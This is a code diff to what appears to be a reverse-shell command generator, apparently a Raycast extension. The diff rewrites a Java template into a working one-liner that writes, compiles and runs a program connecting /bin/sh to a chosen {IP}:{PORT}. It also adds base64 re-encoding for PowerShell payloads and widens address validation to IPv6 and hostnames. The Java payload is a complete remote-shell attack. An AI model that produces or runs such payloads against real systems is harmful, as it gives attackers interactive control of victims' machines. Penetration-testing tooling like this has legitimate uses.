@@ -345,8 +345,8 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     name: "Java",
     icon: "☕",
     command:
-      'java -c \'public class shell { public static void main(String[] args) { try { String host="{IP}"; int port={PORT}; String cmd="/bin/sh"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start(); Socket s=new Socket(host,port); InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed()) { while(pi.available()>0) so.write(pi.read()); while(pe.available()>0) so.write(pe.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); try { p.exitValue(); break; } catch (Exception e){} }; p.destroy(); s.close(); } catch (Exception e){} } }\'',
-    description: "Java Socket reverse shell",
+      'echo \'import java.net.*;import java.io.*;public class shell{public static void main(String[]a)throws Exception{Socket s=new Socket("{IP}",{PORT});InputStream i=s.getInputStream();OutputStream o=s.getOutputStream();Process p=new ProcessBuilder("/bin/sh").redirectErrorStream(true).start();InputStream pi=p.getInputStream(),pe=p.getErrorStream();OutputStream po=p.getOutputStream();byte[]b=new byte[1024];while(true){int r;i.available()>0?(r=i.read(b)):pi.available()>0?(r=pi.read(b)):(Thread.sleep(50),continue);if(r==-1)break;o.write(b,0,r);po.write(b,0,r);o.flush();po.flush();}s.close();p.destroy();}}\' > /tmp/shell.java && javac /tmp/shell.java && java -cp /tmp shell && rm /tmp/shell.java /tmp/shell.class',
+    description: "Java Socket reverse shell (compiles and runs)",
     category: "reverse",
     subcategory: "Compiled Languages",
     os: ["linux", "mac", "windows"],
@@ -477,19 +477,60 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
 
 // Generate all commands
 function generateAllCommands(ip: string, port: string): ShellTemplate[] {
-  return SHELL_TEMPLATES.map((template) => ({
-    ...template,
-    command: template.command.replace(/{IP}/g, ip).replace(/{PORT}/g, port),
-    listener: template.listener?.replace(/{IP}/g, ip).replace(/{PORT}/g, port),
-  }));
+  return SHELL_TEMPLATES.map((template) => {
+    // Special handling for powershell-base64 template
+    if (template.type === "powershell-base64") {
+      // Decode the base64 command
+      const decoded = Buffer.from(template.command, "base64").toString("utf-8");
+      // Replace IP and PORT placeholders
+      const replaced = decoded.replace(/{IP}/g, ip).replace(/{PORT}/g, port);
+      // Re-encode to base64
+      const encoded = Buffer.from(replaced).toString("base64");
+      return {
+        ...template,
+        command: encoded,
+        listener: template.listener
+          ?.replace(/{IP}/g, ip)
+          .replace(/{PORT}/g, port),
+      };
+    }
+
+    // Standard handling for all other templates
+    return {
+      ...template,
+      command: template.command.replace(/{IP}/g, ip).replace(/{PORT}/g, port),
+      listener: template.listener
+        ?.replace(/{IP}/g, ip)
+        .replace(/{PORT}/g, port),
+    };
+  });
 }
 
-// Validate IP address
-function isValidIP(ip: string): boolean {
+// Validate IPv4 address
+function isValidIPv4(ip: string): boolean {
   const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
   if (!ipRegex.test(ip)) return false;
   const parts = ip.split(".");
   return parts.every((part) => parseInt(part) >= 0 && parseInt(part) <= 255);
+}
+
+// Validate IPv6 address
+function isValidIPv6(ip: string): boolean {
+  const ipv6Regex =
+    /^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$|^([0-9a-fA-F]{1,4}:){1,7}:$|^([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}$|^([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}$|^([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}$|^([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}$|^([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}$|^[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})$|^:((:[0-9a-fA-F]{1,4}){1,7}|:)$/;
+  return ipv6Regex.test(ip);
+}
+
+// Validate hostname (domain name)
+function isValidHostname(hostname: string): boolean {
+  const hostnameRegex =
+    /^[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
+  return hostnameRegex.test(hostname) && hostname.length <= 253;
+}
+
+// Validate IP address (IPv4, IPv6, or hostname)
+function isValidIP(ip: string): boolean {
+  return isValidIPv4(ip) || isValidIPv6(ip) || isValidHostname(ip);
 }
 
 // Validate port number
@@ -749,7 +790,7 @@ ${cmd.listener ? `## Listener Command\n\n\`\`\`bash\n${cmd.listener}\n\`\`\`` : 
                       onAction={() => setSortBy("name")}
                     />
                     <Action
-                      title="Sort by Os"
+                      title="Sort by OS"
                       icon={Icon.ComputerChip}
                       shortcut={{ modifiers: ["cmd", "shift"], key: "3" }}
                       onAction={() => setSortBy("os")}
@@ -789,7 +830,7 @@ export default function Command() {
     });
   }, []);
 
-  function handleSubmit(values: FormValues) {
+  async function handleSubmit(values: FormValues) {
     // Validate IP
     if (!isValidIP(values.ip)) {
       setIpError("Invalid IP address format");
@@ -807,7 +848,7 @@ export default function Command() {
     setPortError(undefined);
 
     // Save configuration
-    saveConfig({ ip: values.ip, port: values.port });
+    await saveConfig({ ip: values.ip, port: values.port });
 
     // Navigate to commands list page
     push(<ShowAllCommands ip={values.ip} port={values.port} />);
